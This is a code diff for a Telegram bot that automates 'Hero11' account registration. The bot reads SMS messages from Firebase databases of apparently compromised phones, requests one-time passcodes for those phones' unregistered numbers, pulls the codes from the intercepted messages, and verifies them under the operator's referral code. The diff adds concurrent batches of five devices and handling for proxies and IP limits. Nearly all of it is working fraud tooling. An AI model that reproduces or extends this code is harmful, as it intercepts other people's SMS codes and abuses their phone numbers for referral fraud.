@@ -34,6 +34,8 @@ SOLVERIFY_API_KEY = os.getenv("SOLVERIFY_API_KEY", "RqHPFHbQCNwItxqfh21kDmH0Sx2b
 OTP_TIMEOUT = 25
 POLL_INTERVAL = 2
 TIMEOUT = 30
+BATCH_SIZE = 5
+TARGET_REGISTRATIONS = 2
 
 if not BOT_TOKEN or BOT_TOKEN == "ENTER_YOUR_BOT_TOKEN_HERE" or ":" not in BOT_TOKEN:
     print("❌ Invalid or missing BOT_TOKEN. Set BOT_TOKEN in Railway Variables.")
@@ -205,7 +207,6 @@ def extract_all_phones(messages_dict):
     items = messages_dict.values() if isinstance(messages_dict, dict) else (messages_dict if isinstance(messages_dict, list) else [messages_dict])
     for item in items:
         if isinstance(item, dict):
-            # Check dedicated phone/recipient/sender/address fields first, then body/message
             priority_parts = [
                 str(item.get(k) or "")
                 for k in ("phone", "number", "mobile", "phoneNumber", "recipient", "to", "address", "sender", "title")
@@ -355,7 +356,6 @@ def extract_raw_time(m_val):
     return raw_time
 
 def message_age_seconds(m_val, msg_key: str = "", now_ist: datetime = None):
-    """Returns elapsed seconds in IST for a message, or None if timestamp cannot be determined."""
     if now_ist is None:
         now_ist = datetime.now(IST)
     raw_time = extract_raw_time(m_val)
@@ -368,7 +368,6 @@ def message_age_seconds(m_val, msg_key: str = "", now_ist: datetime = None):
     return max(0, int(diff))
 
 def has_otp_within_window(msgs, window_minutes: int) -> bool:
-    """Checks the device's chat history and returns True only if at least 1 OTP pattern message arrived within window_minutes."""
     if not isinstance(msgs, dict) or not msgs:
         return False
     now_ist = datetime.now(IST)
@@ -581,15 +580,8 @@ async def collect_grouped_unregistered_devices(
     limit: int = 30,
 ):
     """
-    Scans online devices and returns a list of dicts grouped per unique device ID (`cid`):
-    {
-        "firebase_url": fb_url,
-        "db_short_id": db_short_id,
-        "cid": cid,
-        "msgs": msgs,
-        "unreg_phones": ["+91...", ...],
-        "min_age_sec": int or None,
-    }
+    Scans online devices ONLY (`status == True`) and returns a list of dicts grouped per unique device ID (`cid`)
+    containing ONLY unregistered numbers.
     """
     import aiohttp
     skipped_cids = skipped_cids or set()
@@ -603,7 +595,8 @@ async def collect_grouped_unregistered_devices(
 
     async with aiohttp.ClientSession() as session:
         for fb_url in firebase_dbs:
-            db_short_id = fb_url.split('//')[1].split('.')[0][:8]
+            db_panel_name = fb_url.split('//')[1].split('.')[0]
+            db_short_id = db_panel_name[:8]
             try:
                 async with session.get(f"{fb_url}clients.json", timeout=8) as r:
                     clients_data = await r.json() or {}
@@ -615,6 +608,7 @@ async def collect_grouped_unregistered_devices(
                     if device_key in seen_device_keys:
                         continue
 
+                    # Strictly online devices only
                     if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                         try:
                             async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast={limit}', timeout=6) as m_req:
@@ -652,6 +646,7 @@ async def collect_grouped_unregistered_devices(
                                 seen_device_keys.add(device_key)
                                 grouped_results.append({
                                     "firebase_url": fb_url,
+                                    "db_panel_name": db_panel_name,
                                     "db_short_id": db_short_id,
                                     "cid": cid,
                                     "msgs": msgs,
@@ -671,7 +666,7 @@ async def collect_grouped_unregistered_devices(
 def get_main_menu():
     if USER_DATA["is_running"]:
         return InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🛑 Stop Automation", callback_data="stop_automation")]
+            [InlineKeyboardButton(text="🛑 Stop Batch Automation", callback_data="stop_automation")]
         ])
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🔗 Add Firebase(s)", callback_data="add_firebase"),
@@ -687,28 +682,55 @@ def get_main_menu():
          InlineKeyboardButton(text="💬 History (< 24h)", callback_data="hist_win_1440")],
         [InlineKeyboardButton(text="📋 View Active Devices & SMS", callback_data="view_active_sms"),
          InlineKeyboardButton(text="⚡ Check Proxy Health", callback_data="check_proxies")],
-        [InlineKeyboardButton(text="🚀 Start (OTP < 10m)", callback_data="start_auto_10"),
-         InlineKeyboardButton(text="🚀 Start (OTP < 1h)", callback_data="start_auto_60"),
-         InlineKeyboardButton(text="🚀 Start (OTP < 24h)", callback_data="start_auto_1440")]
+        [InlineKeyboardButton(text="⚡ Batch 5 (OTP < 10m)", callback_data="start_auto_10"),
+         InlineKeyboardButton(text="⚡ Batch 5 (OTP < 1h)", callback_data="start_auto_60")],
+        [InlineKeyboardButton(text="⚡ Batch 5 (OTP < 24h)", callback_data="start_auto_1440")]
     ])
 
-class LiveLogger:
-    def __init__(self, message: types.Message):
+class BatchBoardLogger:
+    """Renders a live Telegram batch status board matching the 5-slot concurrent progress layout."""
+    def __init__(self, message: types.Message, window_label: str):
         self.message = message
+        self.window_label = window_label
         self.last_update = 0
         self.last_text = ""
 
-    async def set_text(self, text, force=False):
-        if text == self.last_text:
-            return
+    async def render(self, panel_name: str, batch_num: int, success_count: int, total_needed: int, slots: list, force: bool = False):
         now = time.time()
-        if force or (now - self.last_update > 1.0):
-            try:
-                await self.message.edit_text(f"<code>{html.escape(text)}</code>", parse_mode="HTML", reply_markup=get_main_menu())
-                self.last_update = time.time()
-                self.last_text = text
-            except Exception:
-                pass
+        if not force and (now - self.last_update < 1.0):
+            return
+
+        done_count = sum(1 for s in slots if s["done"])
+        ok_count = sum(1 for s in slots if s["ok"])
+        fail_count = sum(1 for s in slots if s["done"] and not s["ok"])
+
+        rows = []
+        for idx, s in enumerate(slots, start=1):
+            last4 = s["phone"][-4:]
+            short_cid = s["cid"][:12]
+            rows.append(
+                f"<code>[{idx:02d}] …{html.escape(last4)} ({html.escape(short_cid)})</code>  {s['status']}"
+            )
+
+        rows_text = "\n".join(rows) if rows else "<i>Scanning unregistered online devices...</i>"
+        board = (
+            f"⚡ <b>HERO11 AUTO BATCH REGISTRATION (BATCH #{batch_num})</b>\n\n"
+            f"💎 <b>Panel:</b> <code>{html.escape(panel_name)}</code> ({html.escape(self.window_label)})\n"
+            f"📊 <b>Batch Progress:</b> {done_count}/{len(slots)} (🟢 {ok_count} | 🔴 {fail_count}) • <b>Total:</b> {success_count}/{total_needed}\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"<b>DEVICE / MOBILE</b>  |  <b>STATUS</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"{rows_text}"
+        )
+
+        if board == self.last_text:
+            return
+        try:
+            await self.message.edit_text(board, parse_mode="HTML", reply_markup=get_main_menu())
+            self.last_update = time.time()
+            self.last_text = board
+        except Exception:
+            pass
 
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message, state: FSMContext):
@@ -720,7 +742,8 @@ async def cmd_start(message: types.Message, state: FSMContext):
         "👋 <b>Welcome Admin to Hero11 Automation Bot!</b>\n\n"
         f"🔗 <b>Firebase DBs Loaded:</b> {len(USER_DATA['firebase_dbs'])} connected ✅\n"
         f"📝 <b>Active Refer Code (Max 1):</b> <code>{html.escape(current_code)}</code>\n"
-        f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded ⚡\n\n"
+        f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded ⚡\n"
+        f"⚙️ <b>Batch Mode:</b> 5 concurrent unregistered online devices (Cap: 2 OTPs)\n\n"
         "Select an option below:"
     )
     await message.answer(text, parse_mode="HTML", reply_markup=get_main_menu())
@@ -983,7 +1006,7 @@ async def cb_show_history_by_window(callback: types.CallbackQuery):
     default_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "DEFAULT"
 
     status_msg = await callback.message.answer(
-        f"🔍 Grouping unregistered IDs & filtering chat history <b>{html.escape(win_label)}</b>...",
+        f"🔍 Grouping unregistered online IDs & filtering chat history <b>{html.escape(win_label)}</b>...",
         parse_mode="HTML"
     )
 
@@ -1033,7 +1056,7 @@ async def cb_show_history_by_window(callback: types.CallbackQuery):
 
         if not id_blocks:
             await status_msg.edit_text(
-                f"ℹ️ No chat history messages found for <b>unregistered numbers</b> <b>{html.escape(win_label)}</b>.",
+                f"ℹ️ No chat history messages found for <b>unregistered online numbers</b> <b>{html.escape(win_label)}</b>.",
                 parse_mode="HTML",
                 reply_markup=get_main_menu()
             )
@@ -1042,7 +1065,7 @@ async def cb_show_history_by_window(callback: types.CallbackQuery):
             if len(block) > 3800:
                 block = block[:3800] + "\n\n<i>[Truncated]</i>"
             await status_msg.edit_text(
-                f"💬 <b>UNREGISTERED CHAT HISTORY ({html.escape(win_label.upper())}) — {len(id_blocks)} ID(s)</b>\n"
+                f"💬 <b>UNREGISTERED ONLINE CHAT HISTORY ({html.escape(win_label.upper())}) — {len(id_blocks)} ID(s)</b>\n"
                 f"━━━━━━━━━━━━━━━━━━━━\n\n{block}",
                 parse_mode="HTML",
                 reply_markup=get_main_menu()
@@ -1184,7 +1207,8 @@ async def cb_back_to_main(callback: types.CallbackQuery):
         "👋 <b>Welcome Admin to Hero11 Automation Bot!</b>\n\n"
         f"🔗 <b>Firebase DBs Loaded:</b> {len(USER_DATA['firebase_dbs'])} connected ✅\n"
         f"📝 <b>Active Refer Code (Max 1):</b> <code>{html.escape(current_code)}</code>\n"
-        f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded ⚡\n\n"
+        f"🌐 <b>Proxies:</b> {len(USER_DATA['proxies'])} loaded ⚡\n"
+        f"⚙️ <b>Batch Mode:</b> 5 concurrent unregistered online devices (Cap: 2 OTPs)\n\n"
         "Select an option below:"
     )
     await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_main_menu())
@@ -1230,7 +1254,7 @@ async def cb_stop_automation(callback: types.CallbackQuery):
     if USER_DATA["current_task"] and not USER_DATA["current_task"].done():
         USER_DATA["current_task"].cancel()
     USER_DATA["is_running"] = False
-    await callback.message.answer("🛑 <b>Automation successfully stopped by Admin.</b>", parse_mode="HTML", reply_markup=get_main_menu())
+    await callback.message.answer("🛑 <b>Batch Automation successfully stopped by Admin.</b>", parse_mode="HTML", reply_markup=get_main_menu())
     await callback.answer()
 
 @dp.callback_query(F.data.startswith("start_auto_"))
@@ -1238,7 +1262,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
         return
     if USER_DATA["is_running"]:
-        await callback.answer("⚠️ Automation is already running!", show_alert=True)
+        await callback.answer("⚠️ Batch Automation is already running!", show_alert=True)
         return
     if not USER_DATA["firebase_dbs"] or not USER_DATA["codes"]:
         await callback.answer("❌ Please configure Firebase and add your 1 refer code first!", show_alert=True)
@@ -1258,23 +1282,25 @@ async def cb_start_automation(callback: types.CallbackQuery):
 
     USER_DATA["is_running"] = True
     status_msg = await callback.message.answer(
-        f"🚀 <b>Scan Started ({html.escape(window_label)})!</b> Grouping unregistered IDs with OTP pattern in {html.escape(window_label)}...",
+        f"⚡ <b>Batch Scan Started ({html.escape(window_label)})!</b>\n"
+        f"Scanning unregistered online devices (5 per batch, max {TARGET_REGISTRATIONS} OTPs)...",
         parse_mode="HTML",
         reply_markup=get_main_menu()
     )
 
-    async def run_automation():
+    async def run_batch_automation():
         import aiohttp
         firebase_dbs = USER_DATA["firebase_dbs"]
         current_code = USER_DATA["codes"][0]
-        total_needed = 2
+        total_needed = TARGET_REGISTRATIONS
         success_count = 0
         registered_numbers = []
         skipped_phones = set()
         used_phones = set()
         skipped_cids = set()
         reg_cache = {}
-        logger = LiveLogger(status_msg)
+        batch_num = 0
+        board = BatchBoardLogger(status_msg, window_label)
 
         try:
             while success_count < total_needed and USER_DATA["is_running"]:
@@ -1289,122 +1315,214 @@ async def cb_start_automation(callback: types.CallbackQuery):
                     limit=50,
                 )
 
-                candidate_queue = []
+                # Pick up to 5 unregistered online device candidates for this batch
+                batch_candidates = []
                 for dev in grouped:
                     for full_phone in dev["unreg_phones"]:
                         if full_phone not in skipped_phones and full_phone not in used_phones:
-                            candidate_queue.append({
+                            batch_candidates.append({
                                 "firebase_url": dev["firebase_url"],
+                                "db_panel_name": dev["db_panel_name"],
                                 "db_short_id": dev["db_short_id"],
                                 "cid": dev["cid"],
                                 "phone": full_phone,
                             })
+                            if len(batch_candidates) >= BATCH_SIZE:
+                                break
+                    if len(batch_candidates) >= BATCH_SIZE:
+                        break
 
-                if not candidate_queue:
-                    await logger.set_text(f"🔴 Scan complete: No unregistered numbers with OTP pattern in {window_label}. Retrying in 5s...")
+                if not batch_candidates:
+                    await status_msg.edit_text(
+                        f"🔴 <b>No unregistered online devices found ({html.escape(window_label)}).</b>\nRetrying in 5s...",
+                        parse_mode="HTML",
+                        reply_markup=get_main_menu()
+                    )
                     await asyncio.sleep(5)
                     continue
 
-                target = random.choice(candidate_queue)
-                firebase_url = target["firebase_url"]
-                db_short_id = target["db_short_id"]
-                cid = target["cid"]
-                phone = target["phone"]
-                used_phones.add(phone)
+                batch_num += 1
+                panel_name = batch_candidates[0]["db_panel_name"]
+                slots = []
+                for cand in batch_candidates:
+                    used_phones.add(cand["phone"])
+                    slots.append({
+                        "firebase_url": cand["firebase_url"],
+                        "db_short_id": cand["db_short_id"],
+                        "cid": cand["cid"],
+                        "phone": cand["phone"],
+                        "status": "⏳ Requesting OTP...",
+                        "done": False,
+                        "ok": False,
+                    })
 
-                await logger.set_text(f"🎯 [{window_label}] [DB: {db_short_id}] ID: {cid[:8]} | Phone: {phone} | Code: {current_code} | Progress: {success_count}/{total_needed}\n⏳ Requesting OTP...")
+                await board.render(panel_name, batch_num, success_count, total_needed, slots, force=True)
 
-                async with aiohttp.ClientSession() as session:
+                state_lock = asyncio.Lock()
+                cap_reached_event = asyncio.Event()
+
+                async def process_slot(slot_idx: int):
+                    nonlocal success_count
+                    slot = slots[slot_idx]
+                    fb_url = slot["firebase_url"]
+                    cid = slot["cid"]
+                    phone = slot["phone"]
+
+                    if cap_reached_event.is_set() or not USER_DATA["is_running"]:
+                        slot["status"] = "⏭️ Ignored (Cap 2/2)"
+                        slot["done"] = True
+                        return
+
+                    # Snapshot existing message keys before requesting OTP
                     known_keys = set()
                     try:
-                        async with session.get(f'{firebase_url}messages/{cid}.json?shallow=true', timeout=5) as r:
-                            k_data = await r.json()
-                            if isinstance(k_data, dict):
-                                known_keys = set(k_data.keys())
+                        async with aiohttp.ClientSession() as session:
+                            async with session.get(f'{fb_url}messages/{cid}.json?shallow=true', timeout=5) as r:
+                                k_data = await r.json()
+                                if isinstance(k_data, dict):
+                                    known_keys = set(k_data.keys())
                     except Exception:
                         pass
 
-                client = AsyncHero11Client(phone, current_code)
-                try:
-                    send_status = await client.send_otp()
-                    if send_status != "SUCCESS":
-                        skipped_phones.add(phone)
-                        continue
+                    client = AsyncHero11Client(phone, current_code)
+                    try:
+                        send_status = await client.send_otp()
+                        if cap_reached_event.is_set():
+                            slot["status"] = "⏭️ Ignored (Cap 2/2)"
+                            slot["done"] = True
+                            return
 
-                    await logger.set_text(f"🎯 [{window_label}] [DB: {db_short_id}] ID: {cid[:8]} | Phone: {phone} | Code: {current_code}\n⏳ Waiting for OTP (25s timeout)...")
+                        if send_status != "SUCCESS":
+                            skipped_phones.add(phone)
+                            slot["status"] = "❌ Registered / Send Failed"
+                            slot["done"] = True
+                            await board.render(panel_name, batch_num, success_count, total_needed, slots)
+                            return
 
-                    otp_found = None
-                    start_poll = time.time()
-                    while time.time() - start_poll < OTP_TIMEOUT and USER_DATA["is_running"]:
-                        await asyncio.sleep(POLL_INTERVAL)
-                        try:
-                            async with aiohttp.ClientSession() as session:
-                                async with session.get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=15', timeout=5) as r:
-                                    msgs = await r.json()
-                                    if isinstance(msgs, dict):
-                                        for msg_key, msg_val in msgs.items():
-                                            if msg_key not in known_keys and isinstance(msg_val, dict):
-                                                txt = str(msg_val.get("body") or msg_val.get("message") or "")
-                                                for otp in re.findall(r'\b\d{6}\b', txt):
-                                                    if otp not in ["000000", "123456", "111111", "999999"]:
-                                                        otp_found = otp
-                                                        break
-                                        if otp_found:
-                                            break
-                        except Exception:
-                            pass
+                        slot["status"] = "📡 Waiting OTP (25s)..."
+                        await board.render(panel_name, batch_num, success_count, total_needed, slots)
 
-                    if not otp_found:
-                        skipped_phones.add(phone)
-                        continue
+                        otp_found = None
+                        start_poll = time.time()
+                        while (
+                            time.time() - start_poll < OTP_TIMEOUT
+                            and USER_DATA["is_running"]
+                            and not cap_reached_event.is_set()
+                        ):
+                            await asyncio.sleep(POLL_INTERVAL)
+                            if cap_reached_event.is_set():
+                                break
+                            try:
+                                async with aiohttp.ClientSession() as session:
+                                    async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=15', timeout=5) as r:
+                                        msgs = await r.json()
+                                        if isinstance(msgs, dict):
+                                            for msg_key, msg_val in msgs.items():
+                                                if msg_key not in known_keys and isinstance(msg_val, dict):
+                                                    txt = str(msg_val.get("body") or msg_val.get("message") or "")
+                                                    for otp in re.findall(r'\b\d{6}\b', txt):
+                                                        if otp not in ["000000", "123456", "111111", "999999"]:
+                                                            otp_found = otp
+                                                            break
+                                            if otp_found:
+                                                break
+                            except Exception:
+                                pass
 
-                    await logger.set_text(f"🎯 [DB: {db_short_id}] Phone: {phone} | OTP Found: {otp_found}\n🔄 Forcing registration & verification...")
+                        # If 2 OTPs already succeeded in this batch, ignore the 3rd/4th/5th immediately
+                        if cap_reached_event.is_set():
+                            skipped_phones.add(phone)
+                            slot["status"] = "⏭️ Ignored (Cap 2/2)"
+                            slot["done"] = True
+                            await board.render(panel_name, batch_num, success_count, total_needed, slots)
+                            return
 
-                    v_res = "INVALID"
-                    for _ in range(5):
-                        v_res = await client.verify_otp(otp_found)
-                        if v_res in ("SUCCESS", "IP_LIMITED"):
-                            break
-                        await asyncio.sleep(1.5)
+                        if not otp_found:
+                            skipped_phones.add(phone)
+                            slot["status"] = "❌ No OTP Arrived"
+                            slot["done"] = True
+                            await board.render(panel_name, batch_num, success_count, total_needed, slots)
+                            return
 
-                    if v_res == "SUCCESS":
-                        success_count += 1
-                        skipped_phones.add(phone)
-                        registered_numbers.append(f"{phone} (ID: {cid[:8]}, DB: {db_short_id})")
-                        await logger.set_text(f"✅ [DB: {db_short_id}] SUCCESS! ({success_count}/{total_needed}) | Phone: {phone} Registered!", force=True)
-                    elif v_res == "IP_LIMITED":
-                        skipped_phones.add(phone)
-                        await logger.set_text("⚠️ IP Limited / Restricted by Hero11. Rotating proxy...")
-                    else:
-                        skipped_phones.add(phone)
-                        await logger.set_text(f"❌ Verification failed for {phone} after multiple attempts. Moving on...")
-                finally:
-                    await client.close()
+                        # Claim one of the 2 allowed OTP slots atomically before verifying
+                        async with state_lock:
+                            if success_count >= total_needed or cap_reached_event.is_set():
+                                cap_reached_event.set()
+                                skipped_phones.add(phone)
+                                slot["status"] = f"⏭️ OTP {otp_found} Ignored (Cap 2/2)"
+                                slot["done"] = True
+                                await board.render(panel_name, batch_num, success_count, total_needed, slots, force=True)
+                                return
 
-                await asyncio.sleep(3.0)
+                        slot["status"] = f"🔑 OTP {otp_found} • Verifying..."
+                        await board.render(panel_name, batch_num, success_count, total_needed, slots, force=True)
+
+                        v_res = "INVALID"
+                        for _ in range(5):
+                            if cap_reached_event.is_set():
+                                break
+                            v_res = await client.verify_otp(otp_found)
+                            if v_res in ("SUCCESS", "IP_LIMITED"):
+                                break
+                            await asyncio.sleep(1.5)
+
+                        async with state_lock:
+                            if v_res == "SUCCESS" and success_count < total_needed:
+                                success_count += 1
+                                skipped_phones.add(phone)
+                                slot["ok"] = True
+                                slot["done"] = True
+                                slot["status"] = f"✅ Registered ({success_count}/{total_needed})"
+                                registered_numbers.append(f"{phone} (ID: {cid[:12]}, DB: {slot['db_short_id']})")
+                                if success_count >= total_needed:
+                                    cap_reached_event.set()
+                            elif cap_reached_event.is_set():
+                                skipped_phones.add(phone)
+                                slot["done"] = True
+                                slot["status"] = "⏭️ Ignored (Cap 2/2)"
+                            elif v_res == "IP_LIMITED":
+                                skipped_phones.add(phone)
+                                slot["done"] = True
+                                slot["status"] = "⚠️ IP Limited"
+                            else:
+                                skipped_phones.add(phone)
+                                slot["done"] = True
+                                slot["status"] = "❌ Verify Failed"
+
+                        await board.render(panel_name, batch_num, success_count, total_needed, slots, force=True)
+                    finally:
+                        await client.close()
+
+                # Launch all 5 slots concurrently
+                await asyncio.gather(*(process_slot(i) for i in range(len(slots))))
+                await board.render(panel_name, batch_num, success_count, total_needed, slots, force=True)
+
+                if success_count < total_needed and USER_DATA["is_running"]:
+                    await asyncio.sleep(2.5)
 
             USER_DATA["is_running"] = False
             if success_count >= total_needed:
                 numbers_list_str = "\n".join([f"• <code>{html.escape(num)}</code>" for num in registered_numbers])
                 final_msg = (
-                    f"🎉 <b>HERO11 REGISTRATION COMPLETED!</b> 🎉\n"
+                    f"🎉 <b>HERO11 BATCH REGISTRATION COMPLETED!</b> 🎉\n"
                     f"━━━━━━━━━━━━━━━━━━━━\n"
                     f"⏱️ <b>Filter Window:</b> OTP in {html.escape(window_label)}\n"
+                    f"📦 <b>Batches Run:</b> {batch_num} (5 concurrent/batch)\n"
                     f"✅ <b>Successful Registrations:</b> {success_count}/{total_needed}\n"
-                    f"📱 <b>Exact Registered Numbers & DB Source:</b>\n{numbers_list_str}\n"
+                    f"📱 <b>Registered Numbers & Device IDs:</b>\n{numbers_list_str}\n"
                     f"━━━━━━━━━━━━━━━━━━━━"
                 )
                 await callback.message.answer(final_msg, parse_mode="HTML", reply_markup=get_main_menu())
             else:
-                await callback.message.answer("🛑 <b>Automation was stopped or IP limited.</b>", parse_mode="HTML", reply_markup=get_main_menu())
+                await callback.message.answer("🛑 <b>Batch Automation stopped.</b>", parse_mode="HTML", reply_markup=get_main_menu())
 
         except asyncio.CancelledError:
             USER_DATA["is_running"] = False
         except Exception as e:
             USER_DATA["is_running"] = False
-            await callback.message.answer(f"❌ Error in automation loop: {html.escape(str(e))}", reply_markup=get_main_menu())
+            await callback.message.answer(f"❌ Error in batch automation: {html.escape(str(e))}", reply_markup=get_main_menu())
 
-    USER_DATA["current_task"] = asyncio.create_task(run_automation())
+    USER_DATA["current_task"] = asyncio.create_task(run_batch_automation())
     await callback.answer()
 
 async def main():
